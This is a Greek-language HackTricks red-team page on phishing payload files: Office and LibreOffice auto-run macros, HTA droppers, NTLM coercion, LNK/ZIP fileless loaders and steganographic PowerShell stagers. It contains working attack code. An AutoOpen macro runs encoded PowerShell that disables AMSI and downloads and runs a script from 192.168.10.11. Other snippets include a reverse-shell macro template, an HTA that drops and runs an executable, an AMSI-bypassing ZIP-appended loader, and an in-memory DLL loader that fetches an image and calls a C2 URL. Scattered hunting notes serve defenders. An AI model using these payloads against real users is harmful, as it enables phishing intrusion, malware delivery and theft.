# Αρχεία & Έγγραφα Phishing

{{#include ../../banners/hacktricks-training.md}}

## Έγγραφα Office

Το Microsoft Word πραγματοποιεί επικύρωση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων πραγματοποιείται με τη μορφή αναγνώρισης της δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Αν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοιχτεί.

Συνήθως, τα αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομαστεί το αρχείο αλλάζοντας την επέκταση αρχείου και να διατηρηθούν οι δυνατότητες εκτέλεσης των macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros, εκ σχεδιασμού, αλλά ένα αρχείο DOCM που έχει μετονομαστεί σε RTF θα αντιμετωπιστεί από το Microsoft Word και θα έχει τη δυνατότητα εκτέλεσης macros.\
Τα ίδια εσωτερικά στοιχεία και οι ίδιοι μηχανισμοί ισχύουν για όλο το λογισμικό της Microsoft Office Suite (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις πρόκειται να εκτελεστούν από ορισμένα Office προγράμματα:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX αρχεία που αναφέρονται σε ένα απομακρυσμένο template (File –Options –Add-ins –Manage: Templates –Go), το οποίο περιλαμβάνει macros, μπορούν επίσης να «εκτελέσουν» macros.

### External Image Load

Μεταβείτε στο: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture και **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Μεταβείτε στο: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Είναι δυνατή η χρήση macros για την εκτέλεση arbitrary code από το document.

#### Autoload functions

Όσο πιο common είναι, τόσο πιο πιθανό είναι να τα ανιχνεύσει το AV.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Χειροκίνητη αφαίρεση metadata

Πηγαίνετε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα ανοίξει το Document Inspector. Κάντε κλικ στο **Inspect** και έπειτα στο **Remove All** δίπλα στο **Document Properties and Personal Information**.

#### Επέκταση Doc

Όταν τελειώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type** και αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
Κάντε το επειδή **δεν μπορείτε να αποθηκεύσετε macro μέσα σε ένα `.docx`** και υπάρχει **στίγμα** **γύρω από** την επέκταση **`.docm`**, η οποία υποστηρίζει macro (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένα web/email gateway τα αποκλείουν εντελώς). Επομένως, αυτή η **παλαιού τύπου επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

Τα έγγραφα LibreOffice Writer μπορούν να ενσωματώνουν Basic macros και να τα εκτελούν αυτόματα όταν ανοίγει το αρχείο, συνδέοντας το macro με το event **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Ένα απλό reverse shell macro μοιάζει ως εξής:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Σημειώστε τα διπλά εισαγωγικά (`""`) μέσα στο string – το LibreOffice Basic τα χρησιμοποιεί για να διαφύγει τα κυριολεκτικά εισαγωγικά, επομένως τα payloads που τελειώνουν σε `...==""")` διατηρούν ισορροπημένα τόσο την εσωτερική εντολή όσο και το όρισμα του Shell.

Συμβουλές παράδοσης:

- Αποθηκεύστε το ως `.odt` και συνδέστε το macro με το document event, ώστε να εκτελείται αμέσως κατά το άνοιγμα.
- Κατά την αποστολή email με `swaks`, χρησιμοποιήστε `--attach @resume.odt` (το `@` απαιτείται ώστε να αποσταλούν τα bytes του αρχείου και όχι το string του ονόματος ως attachment). Αυτό είναι κρίσιμο όταν γίνεται abuse σε SMTP servers που αποδέχονται αυθαίρετους παραλήπτες `RCPT TO` χωρίς validation.

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και scripting languages (όπως VBScript και JScript)**. Δημιουργεί το user interface και εκτελείται ως εφαρμογή «πλήρως έμπιστη», χωρίς τους περιορισμούς του security model ενός browser.

Ένα HTA εκτελείται με το **`mshta.exe`**, το οποίο συνήθως **εγκαθίσταται** μαζί με τον **Internet Explorer**, καθιστώντας το **`mshta` εξαρτώμενο από τον IE**. Επομένως, αν έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός NTLM Authentication

Υπάρχουν διάφοροι τρόποι για να **εξαναγκάσετε NTLM authentication "απομακρυσμένα"**, για παράδειγμα, θα μπορούσατε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που θα προσπελάσει ο χρήστης (ακόμη και HTTP MitM;). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **ενεργοποιήσουν** ένα **authentication** μόνο με το **άνοιγμα του φακέλου.**

**Ελέγξτε αυτές τις ιδέες και άλλες στις ακόλουθες σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή το authentication, αλλά και να **πραγματοποιήσετε NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (αλυσίδα χωρίς αρχεία)

Εξαιρετικά αποτελεσματικές campaigns παραδίδουν ένα ZIP που περιέχει δύο νόμιμα έγγραφα-δόλωμα (PDF/DOCX) και ένα κακόβουλο .lnk. Το κόλπο είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από ένα μοναδικό marker, και το .lnk τον απομονώνει και τον εκτελεί πλήρως στη μνήμη.<sup>[[2]](#references)</sup>

Τυπική ροή που υλοποιείται από το PowerShell one-liner του .lnk:

1) Εντοπίζει το αρχικό ZIP σε κοινές διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData% και τον γονικό φάκελο του τρέχοντος working directory.
2) Διαβάζει τα bytes του ZIP και εντοπίζει ένα hardcoded marker (π.χ. xFIQCV). Ό,τι ακολουθεί μετά το marker είναι το embedded PowerShell payload.
3) Αντιγράφει το ZIP στο %ProgramData%, κάνει extract εκεί και ανοίγει το decoy .docx ώστε να φαίνεται νόμιμο.
4) Κάνει bypass το AMSI για την τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Κάνει deobfuscate το επόμενο στάδιο (π.χ. αφαιρεί όλους τους χαρακτήρες #) και το εκτελεί στη μνήμη.

Παράδειγμα PowerShell skeleton για την απομόνωση και εκτέλεση του embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Σημειώσεις
- Η παράδοση συχνά κάνει abuse σε subdomains αξιόπιστων PaaS (π.χ. *.herokuapp.com) και μπορεί να εφαρμόζει gate στα payloads (να παρέχει benign ZIPs ανάλογα με το IP/UA).
- Το επόμενο stage συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc, ώστε να ελαχιστοποιούνται τα artifacts στον δίσκο.

Persistence που χρησιμοποιείται στην ίδια αλυσίδα
- COM TypeLib hijacking του Microsoft Web Browser control, ώστε το IE/Explorer ή οποιοδήποτε app το ενσωματώνει να επανεκκινεί αυτόματα το payload.<sup>[[2]](#references)[[4]](#references)</sup> Δείτε λεπτομέρειες και commands έτοιμα για χρήση εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files που περιέχουν το ASCII marker string (π.χ. xFIQCV) appended στα archive data.
- .lnk που κάνει enumerate τους parent/user folders για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
- AMSI tampering μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads που καταλήγουν σε links hosted κάτω από trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Ένα ακόμη recurring pattern είναι ένα **document-impersonating `.lnk`** που ανοίγει αμέσως ένα benign lure, ενώ κάνει stage την πραγματική αλυσίδα στο background.<sup>[[3]](#references)</sup>

Observed workflow:
1. Το shortcut **masquerades as a PDF** και χρησιμοποιεί το `conhost.exe` ή παρόμοιο proxy για να κάνει spawn έναν obfuscated PowerShell downloader.
2. Το PowerShell κάνει fragment obvious tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), ώστε naive detections που αναζητούν `iwr`, `gci`, `ren`, `cpi` ή `schtasks` να μην εντοπίζουν το command.
3. Το stager κατεβάζει πρώτα το **decoy document**, το ανοίγει για το victim και στη συνέχεια ανακατασκευάζει τα malicious files στο background.
4. Τα payloads μπορεί να γράφονται με **junk extensions** και στη συνέχεια να μετονομάζονται με stripping των filler characters, καθυστερώντας την εμφάνιση προφανών `.exe` / `.cpl` artifacts.
5. Το Persistence εγκαθίσταται με ένα **minute-based scheduled task** που εκκινεί ένα trusted host binary από user-writable path.

Minimal hunting clues από αυτό το pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Μια χρήσιμη διάταξη staging που αξίζει να αναγνωρίζετε είναι:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ή `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Γιατί το δεύτερο στάδιο είναι stealthy

Στη μελέτη περίπτωσης της Rapid7, το scheduled task εκκινούσε επανειλημμένα το **`Fondue.exe`** από το `C:\Users\Public\`. Επειδή το **`APPWIZ.cpl`** είχε τοποθετηθεί δίπλα του και έκανε export το **`RunFODW`**, το trusted Microsoft binary φόρτωνε μέσω side-loading το CPL του attacker αντί για το νόμιμο system copy.

Το CPL:
- Διαβάζει ένα blob **AES-256-CBC** από το `C:\Windows\Tasks\editor.dat`
- Το αποκρυπτογραφεί μέσω των **Windows CNG / `bcrypt.dll`**
- Δεσμεύει executable memory και αντιγράφει το decrypted shellcode
- Το εκτελεί έμμεσα, περνώντας τον δείκτη του shellcode ως callback για το **`EnumUILanguagesW`**

Αυτό το τελευταίο βήμα αξίζει να αναζητείται ξεχωριστά: το malware συχνά αποφεύγει ένα άμεσο άλμα `((void(*)())buf)()` και, αντί αυτού, καταχράται ένα **legitimate callback-taking WinAPI** για να μεταφέρει την εκτέλεση.

Το decrypted payload σε αυτή την campaign ήταν **Donut** shellcode, το οποίο στη συνέχεια έκανε πλήρες mapping του τελικού PE στη memory και έκανε patch τα **AMSI/WLDP/ETW** στο current process πριν παραδώσει την εκτέλεση. Για πιο αναλυτικές σημειώσεις σχετικά με το side-loading και το memory-resident post-processing, δείτε:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Πρακτικά hunting pivots:
- `.lnk` που εκκινεί `powershell.exe` ή `conhost.exe` και στη συνέχεια ανοίγει ένα εμφανές decoy document.
- Downloads μικρής διάρκειας στο **`C:\Users\Public\`**, ακολουθούμενα από άμεσες μετονομασίες από nonsense extensions.
- Scheduled tasks με αδιάφορα ονόματα, όπως `GoogleErrorReport`, που εκτελούν αρχεία από **user-writable directories**.
- Trusted binaries που φορτώνουν αρχεία **`.cpl` / `.dll`** από τον ίδιο non-system directory.
- Base64 text blobs που γράφονται κάτω από το **`C:\Windows\Tasks\`** και στη συνέχεια διαβάζονται από το side-loaded module.

## Steganography-delimited payloads σε images (PowerShell stager)

Πρόσφατες loader chains παραδίδουν ένα obfuscated JavaScript/VBS που αποκωδικοποιεί και εκτελεί ένα Base64 PowerShell stager. Αυτό το stager κατεβάζει ένα image (συχνά GIF) που περιέχει ένα Base64-encoded .NET DLL κρυμμένο ως plain text μεταξύ μοναδικών start/end markers. Το script αναζητά αυτά τα delimiters (παραδείγματα που έχουν παρατηρηθεί στην πράξη: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το between-text, το κάνει Base64-decode σε bytes, φορτώνει το assembly in-memory και καλεί μια γνωστή entry method με το C2 URL.<sup>[[5]](#references)</sup>

Ροή εργασίας
- Stage 1: Archived JS/VBS dropper → αποκωδικοποιεί το embedded Base64 → εκκινεί PowerShell stager με -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → κατεβάζει image, απομονώνει το marker-delimited Base64, φορτώνει το .NET DLL in-memory και καλεί τη method του (π.χ. VAI), περνώντας το C2 URL και options.
- Stage 3: Ο loader ανακτά το final payload και συνήθως το κάνει inject μέσω process hollowing σε ένα trusted binary (συχνά το MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Δείτε περισσότερα σχετικά με το process hollowing και το trusted utility proxy execution εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example για την απομόνωση ενός DLL από ένα image και την invocation μιας .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Σημειώσεις
- Αυτό είναι το ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Οι markers διαφέρουν ανά campaign.
- Τα AMSI/ETW bypass και η απο-συσκότιση συμβολοσειρών εφαρμόζονται συνήθως πριν από τη φόρτωση του assembly.
- Hunting: σαρώστε τις ληφθείσες εικόνες για γνωστούς delimiters· εντοπίστε PowerShell που αποκτά πρόσβαση σε εικόνες και αποκωδικοποιεί άμεσα blobs Base64.

Δείτε επίσης τα stego tools και τις τεχνικές carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Ένα συνηθισμένο αρχικό στάδιο είναι ένα μικρό, heavily-obfuscated `.js` ή `.vbs` που παραδίδεται μέσα σε archive. Ο μοναδικός σκοπός του είναι να αποκωδικοποιήσει ένα ενσωματωμένο string Base64 και να εκκινήσει το PowerShell με `-nop -w hidden -ep bypass`, ώστε να bootstrapάρει το επόμενο στάδιο μέσω HTTPS.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Ανάγνωση των περιεχομένων του ίδιου του αρχείου
- Εντοπισμός ενός blob Base64 μεταξύ junk strings
- Αποκωδικοποίηση σε ASCII PowerShell
- Εκτέλεση με `wscript.exe`/`cscript.exe`, καλώντας το `powershell.exe`

Ενδείξεις για Hunting
- Archived συνημμένα JS/VBS που εκκινούν το `powershell.exe` με `-enc`/`FromBase64String` στη γραμμή εντολών.
- `wscript.exe` που εκκινεί το `powershell.exe -nop -w hidden` από προσωρινές διαδρομές χρηστών.

## Windows αρχεία για κλοπή NTLM hashes

Ελέγξτε τη σελίδα σχετικά με τα **σημεία κλοπής NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Αναφορές

- [1] [HTB Job – Μακροεντολή LibreOffice → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campaign ZipLine: Μια εξελιγμένη phishing επίθεση που στοχεύει εταιρείες των ΗΠΑ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Παρακολούθηση του tradecraft του Dropping Elephant μέσω μιας αλυσίδας loader με θέμα την Κίνα](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Νέα τεχνική persistence μέσω COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Ο PhantomVAI Loader παραδίδει μια σειρά από infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
